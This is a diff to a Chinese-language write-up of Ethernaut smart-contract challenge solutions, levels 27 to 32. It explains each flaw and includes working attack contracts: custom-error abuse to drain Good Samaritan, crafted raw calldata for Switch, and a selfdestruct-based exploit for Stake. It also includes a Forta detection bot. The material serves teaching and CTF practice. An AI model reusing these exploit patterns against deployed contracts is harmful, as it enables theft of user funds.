@@ -540,13 +540,15 @@ contract Hack1 {
 ```
 
 ## 27. DoubleEntryPoint
-LGT代币重写了transfer函数, DET代币可以通过LGT的transfer函数转移代币, 
+
+LGT代币重写了transfer函数, DET代币可以通过LGT的transfer函数转移代币,
 利用这一点CryptoVault的sweepToken函数可以通过LGT代币转移DET代币,
 通过DoubleEntryPoint合约获取cryptoVault, forta地址
 AlertBot需要阻止delegateTransfer函数调用, 此时handleTransaction函数可以获取到forta.notify()的msg.data
 从msg.data中解析出oriSender, 如果oriSender为cryptoVault, 则调用raiseAlert()函数
 
 参考: https://blog.dixitaditya.com/ethernaut-level-26-doubleentrypoint
+
 ```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -558,7 +560,9 @@ interface IDetectionBot {
 
 interface IForta {
     function setDetectionBot(address detectionBotAddress) external;
+
     function notify(address user, bytes calldata msgData) external;
+
     function raiseAlert(address user) external;
 }
 
@@ -572,7 +576,7 @@ contract AlertBot is IDetectionBot {
             origSender := calldataload(0xa8)
         }
 
-        if(origSender == cryptoVault) {
+        if (origSender == cryptoVault) {
             IForta(msg.sender).raiseAlert(user);
         }
     }
@@ -581,9 +585,11 @@ contract AlertBot is IDetectionBot {
 ```
 
 ## 28. Good Samaritan
+
 当调用requestDonation函数时, 底层的transfer函数会调用dest合约的notify函数, 此时触发NotEnoughBalance 错误
 可以使requestDonation转移剩余所有代币到Hack合约,
 注意只在notify函数amount为10时触发错误, 否则后续的transferRemainder函数也会失败
+
 ```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -594,12 +600,12 @@ interface INotifyable {
 }
 
 interface Coin {
-    function balances(address) external view returns(uint256);
+    function balances(address) external view returns (uint256);
 
 }
 
 interface Wallet {
-    
+
 }
 
 interface GoodSamaritan {
@@ -610,6 +616,7 @@ contract Hack {
     Coin c = Coin(0xfCb5F4521019d4E1fC1F7d692881b41D991Fdb61);
     Wallet w = Wallet(0x2Db97F6fa08c90FC9467246Ac1713B6b3509363F);
     GoodSamaritan g = GoodSamaritan(0x7c5565188Fe17947BDD793C2D03284a0D9b93979);
+
     error NotEnoughBalance();
 
     constructor() {
@@ -618,7 +625,7 @@ contract Hack {
     function attack() public {
         bool r = g.requestDonation();
         require(r == false, "not triggered");
-        require(c.balances(address(w))==0, "not finished");
+        require(c.balances(address(w)) == 0, "not finished");
     }
 
     function notify(uint256 amount) pureF external {
@@ -628,23 +635,31 @@ contract Hack {
     }
 }
 ```
+
 ## 29. GateKeeper Three
+
 通过合约调用construct0r函数, 并通过相同合约调用enter函数绕过gateOne限制,
 同一笔tx中的block.timestamp变量都相同, 先createTrick初始化trick, 再调用getAllowance绕过gateTwo
 向GatekeeperThree转0.0011ether, 并且Hack合约不实现receive函数绕过gateThree
- 
+
 ```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 
 interface GatekeeperThree {
-    function entrant() external view returns(address);
-    function owner() external view returns(address);
-    function allowEntrance() external view returns(bool);
+    function entrant() external view returns (address);
+
+    function owner() external view returns (address);
+
+    function allowEntrance() external view returns (bool);
+
     function getAllowance(uint256 _password) external;
+
     function construct0r() external;
+
     function createTrick() external;
+
     function enter() external;
 }
 
@@ -668,17 +683,52 @@ contract Hack {
 ```
 
 ## 30. Switch
+
 要将switchOn变量改为true, 必须触发turnSwitchOn()函数, 该函数又只能由合约本身调用,
 因此只能通过flipSwitch函数触发,
 flipSwitch函数限制了调用data的函数为turnSwitchOff, 需要构造calldata既能满足条件,又能调用到turnSwitchOn函数
 构造合适的calldata, 欺骗flipSwitch函数, 使其调用turnSwitchOn函数
 flipSwitch读取calldata的调用函数是硬编码的,可以利用
 注意不要通过合约ABI函数调用, 直接使用calldata
+
 ```solidity
 Switch s = new Switch();
 vm.startPrank(eoaAddress);
 address(s).call(hex'30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000');
 vm.stopPrank();
 ```
+
 参考:https://degatchi.com/articles/reading-raw-evm-calldata
 ![img.png](../images/img.png)
+
+## 31. HigherOrder
+
+该函数会将calldata的第4个字节开始的32字节数据存储到treasury变量
+
+> sstore(treasury_slot, calldataload(4))
+
+通过构造calldata, 将传入的calldata对应数据设定为大于255的值
+![img.png](../images/img1.png)
+
+## 32. Stake
+0xdd62ed3e是函数allowance(address,address)字节签名, 该函数用于获取ERC20代币的授权额度	
+0x23b872dd是函数transferFrom(address,address,uint256)字节签名, 该函数用于转移ERC20代币
+
+StakeWETH函数的下面这行代码, 返回值是bool, 用于判断是否调用成功, 这里没有判断转账是否成功, 导致用户可以随意质押代币
+> (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
+
+Unstake函数下面的这行代码同样没有判断是否成功, 导致用户可以在不提取合约余额的情况下将质押量改为0
+> (bool success, ) = payable(msg.sender).call{value : amount}("");
+
+攻击步骤:
+使用用户地址StakeETH再解质押, 使用户地址成为质押者, 满足条件一
+再部署下面的合约, 满足totalStaked > 合约余额 > 0
+```solidity
+contract Hack {
+    constructor(Stake s) payable {
+        WETH(s.WETH()).approve(address(s), type(uint256).max);
+        s.StakeWETH(1 ether);
+        selfdestruct(payable(address(s)));
+    }
+}
+```
